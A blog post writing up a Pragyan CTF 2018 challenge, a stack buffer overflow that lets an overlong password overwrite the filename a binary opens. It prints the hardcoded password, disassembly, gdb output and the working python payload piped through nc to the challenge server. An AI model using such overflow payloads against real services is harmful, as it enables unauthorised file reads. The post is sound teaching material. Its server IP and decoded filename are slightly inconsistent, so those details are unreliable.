---
layout: post
title:  "[Pragyan CTF 2018] Old school hack"
date:   2018-03-02 14:52:25 +0000
categories: "CTF"
comments: true
---

I played [Pragyan CTF](https://ctf.pragyan.org/home) for a few challenges and I thought the "Old School Hack" challenge should be great for a first post.

Gatheting information
---------------------

The challenge is running at 28.199.224.175:13000, but it also comes with a binary file named "police_academy" so let's start with it:
{% highlight html %}
└───▶ file police_academy
police_academy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=db4dffbb6fd12d16c55cab166d1d1a9698374b5f, not stripped
{% endhighlight %}
The **file** command inform us that this binary is an ELF for x86-64 architectures, that it's dynamically linked and most importantly that it's not stripped so it should be easier to disassemble.

Then comes the obvious **strings** command, which will give us useful information:
{% highlight html %}
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Enter password to authentic yourself :
kaiokenx20
Incorrect password. Closing connection.
Enter case number:
	 1) Application_1
	 2) Application_2
	 3) Application_3
	 4) Application_4
	 5) Application_5
	 6) Application_6
	 7) Flag
	 Enter choice :-
You don't have the required privileges to view the flag, yet.
No such record exists. Please verify your choice.
{% endhighlight %}
Yeah, a lot of things.

### First detonation

Let's run the binary and see what it does:
{% highlight shell %}
└───▶ chmod +x police_academy
┌─[✔]───[fabien@fabien-pc]───[pragyan_ctf]───[10 files, 72K]
└───▶ ./police_academy
Enter password to authentic yourself :
{% endhighlight %}
Hmmm... It asks for a password. At this point we can note the first input field of the program, it can be useful for later. I tried several random characters; didn't work.

Maybe our input password will merely be compared to another string that is hardcoded in the binary, and if so, this string should be in the **strings** output. But let's be clear here, I just randomly tried the string "kaiokenx20" just after "Enter password to authentic yourself :" before thinking about this because it was too big to not try, and it works.
{% highlight html %}
└───▶ ./police_academy
Enter password to authentic yourself : kaiokenx20
Enter case number:

	 1) Application_1
	 2) Application_2
	 3) Application_3
	 4) Application_4
	 5) Application_5
	 6) Application_6
	 7) Flag

	 Enter choice :-
{% endhighlight %}

Second input field. Now obvisouly, let's try the option 7 "Flag":
{% highlight html %}
	 Enter choice :- 7
You don't have the required privileges to view the flag, yet.
{% endhighlight %}
Yeah, it may not be that easy. The other options just close the connection, but we'll see why later. Let's try to find something interesting in the disassembly code.

Static analysis
---------------------
I used radare2 + cutter as a GUI (which is very cool to use) to disassemble the binary. Let's examine our first input, and navigate to the first **scanf** call:
{% highlight nasm %}
0x004009e1           call sym.imp.__isoc99_scanf
0x004009e6           lea  rax, qword rbp - 0x40
0x004009ea           mov  edx, 0xa
0x004009ef           mov  esi, str.kaiokenx20                         ; 0x400ec8 ; "kaiokenx20"
0x004009f4           mov  rdi, rax
0x004009f7           call sym.imp.strncmp
{% endhighlight %}

 After the first **scanf**, we can observe that our input is indeed compared to *kaiokenx20*, but it uses **strncmp** with the first 10 characters (the last parameter seems to be *edx* which is 0xa). Thus, for example **strncmp("kaiokenx20", "kaiokenx20AAAA", 10)** should return 0. We will exploit this later. Also, our input is *rbp-0x40* in the stack.

 Next **scanf**:
 {% highlight nasm %}
 lea  rax, qword rbp - 0x48
0x00400ab6           call sym.imp.__isoc99_scanf
0x00400abb           mov  eax, dword [local_48h]
0x00400abe           cmp  eax, 7                                      ; 7
0x00400ac1           ja   0x400cb8
{% endhighlight %}
Our second input is *rbp - 0x48* in the stack and is compared to 7 which is the number of options. If above (ja), it jumps to 0x400cb8. I thought in first place that it was the end of the main function. But nop, just before a function called **print_record**.

Just after the jump, there is another jump and 6 times the almost same code pattern.
 {% highlight nasm %}
 0x00400ac7           mov  eax, eax
 0x00400ac9           mov  rax, qword [rax*8 + 0x401028]               ; [0x401028:8]=0x400cb8 "H.E.H........E..}..u....@"
 0x00400ad1           jmp  rax

 0x00400ad3           lea  rax, qword rbp - 0x30
 0x00400ad7           movabs rcx, 0x3037303838356132
 0x00400ae1           mov  qword [rax], rcx
 0x00400ae4           movabs rdx, 0x3566356538656130
 0x00400aee           mov  qword [rax + 8], rdx
 0x00400af2           movabs rcx, 0x6339666439616331
 0x00400afc           mov  qword [rax + 0x10], rcx
 0x00400b00           movabs rdx, 0x6436353334346135
 0x00400b0a           mov  qword [rax + 0x18], rdx
 0x00400b0e           mov  dword [rax + 0x20], 0x7461642e              ; [0x7461642e:4]=-1
 0x00400b15           mov  byte [rax + 0x24], 0
 0x00400b19           jmp  0x400cb8
{% endhighlight %}
The first three lines will jump to one of these pattern, for instance to 0x00400ad3 if we choose the first option. It clearly constructs a string which is placed just after our first input in the stack... Seems like a buffer overflow exploitation. This is in little endian so the string is:
 {% highlight html %}
0x3037303838356132 + 0x3566356538656130 + 0x6339666439616331 + 0x6436353334346135 + 0x7461642e =
38303730326135386535663530616538646639633163613933353664356134342E646174 =
80702a58e5f50ae8df9c1ca9356d5a44.dat
{% endhighlight %}
It also add a null byte at the end, to terminate the string (0x00400b15). Then, it jumps just before **print_record** again.

A quick look at this function seems to show that it first checks the lenght of a string (the one it just constructs?), compare it to 36 (0x24) (which is the size of the constructed string again), and if it's not equal quit the function. Otherwise it will try to open the file and print what's inside (**fopen** and **fread**).

For the option 7, it constructs the string "flag.txt". We can now easily assume that the flag is in this file.

Dynamic analysis
---------------------
Let's now run it with gdb. For now I just want to see if it's gonna open the file named *80702a58e5f50ae8df9c1ca9356d5a44.dat* for the first option. I'll just set a breakpoint at the **fopen** instruction to see if the string is one of its arguments:
{% highlight nasm %}
gdb-peda$ r <<<$(python -c "print('kaiokenx20' + '\n' +'1')")
...
	0x4008cf <print_record+73>:	mov    rax,QWORD PTR [rbp-0x348]
	0x4008d6 <print_record+80>:	mov    esi,0x400d98
	0x4008db <print_record+85>:	mov    rdi,rax
	=>0x4008de <print_record+88>:	call   0x400750 <fopen@plt>
	0x4008e3 <print_record+93>:	mov    QWORD PTR [rbp-0x338],rax
	0x4008ea <print_record+100>:	cmp    QWORD PTR [rbp-0x338],0x0
	0x4008f2 <print_record+108>:	jne    0x4008fe <print_record+120>
	0x4008f4 <print_record+110>:	mov    eax,0xffffffff
Guessed arguments:
arg[0]: 0x7fffffffe010 ("2a5880700ae8e5f51ca9df9c5a44356d.dat")
arg[1]: 0x400d98 --> 0x72 ('r')
{% endhighlight %}
Yep, looks like it will try to open *2a5880700ae8e5f51ca9df9c5a44356d.dat*. I created a file with this name and some random characters in it and yes it opens and outputs it.

We also want to give a look on how where the string is placed in the stack.  Let's set a breakpoint before the call to **print_record** in the **main** function:
{% highlight nasm %}
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdff0 --> 0x0
0008| 0x7fffffffdff8 --> 0x1
0016| 0x7fffffffe000 ("kaiokenx20")
0024| 0x7fffffffe008 --> 0x3032 ('20')
0032| 0x7fffffffe010 ("2a5880700ae8e5f51ca9df9c5a44356d.dat")
0040| 0x7fffffffe018 ("0ae8e5f51ca9df9c5a44356d.dat")
0048| 0x7fffffffe020 ("1ca9df9c5a44356d.dat")
0056| 0x7fffffffe028 ("5a44356d.dat")
[------------------------------------------------------------------------------]
{% endhighlight %}
Following our first input, we have the name of the file to open. And note that the **print_record** function read the same string at the same address (0x7fffffffe010).

It's now easy to think of a potential payload:

+ First we have the password buffer which is not controlled and with which we can write futher down the stack. Remember, the password buffer is at *rbp-0x40* and the file name should start at *rbp - 0x30*. The password string should be 16 characters.
+ Then, we will write the name of the file. It has to be 36 characters long to match the **strlen** test in **print_record**.
+ Finally, we have to choose an option above 7 to jump directly to **print_record**.

A potential payload should be:

{% highlight shell %}
python -c "print('kaiokenx20AAAAAA.' + '/'*27 + 'flag.txt' + '\n8')" | ./police_academy
{% endhighlight %}

Now, let's create a file named "flag.txt" in the same folder as the binary. We'll try to read it.

{% highlight shell %}
└───▶ python -c "print('kaiokenx20AAAAAA.' + '/'*27 + 'flag.txt' + '\n8')" | ./police_academy
...
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

FLAG


XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

It works ! Now, let's try it on *28.199.224.175 13000*:

{% highlight shell %}
└───▶ python -c "print('kaiokenx20AAAAAA.' + '/'*27 + 'flag.txt' + '\n8')" | nc 128.199.224.175 13000
...
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

The flag is :- pctf{bUff3r-0v3Rfl0wS`4r3.alw4ys-4_cl4SsiC}
9^

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

Really easy one but it was kind of fun.
